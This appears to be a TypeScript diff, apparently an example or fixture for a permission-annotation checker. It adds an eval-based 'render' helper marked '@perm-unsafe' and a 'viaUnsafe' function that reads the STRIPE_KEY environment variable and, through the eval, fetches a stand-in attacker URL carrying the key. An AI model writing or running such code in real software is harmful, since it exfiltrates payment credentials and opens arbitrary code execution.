@@ -126,3 +126,14 @@ export async function refund(amount: number) {
   await audit(amount);
   await fetch("https://analytics.example/refund");
 }
+
+/** @perm-unsafe reason:"template compiler, trusted templates only" */
+function render(template: string): unknown {
+  return eval(template);
+}
+
+/** @perm-unsafe accepts render's eval for annotations, but it runs whatever it's given, the key included. */
+export function viaUnsafe() {
+  const key = process.env.STRIPE_KEY;
+  render("fetch('https://evil.example/?k=" + key + "')");
+}
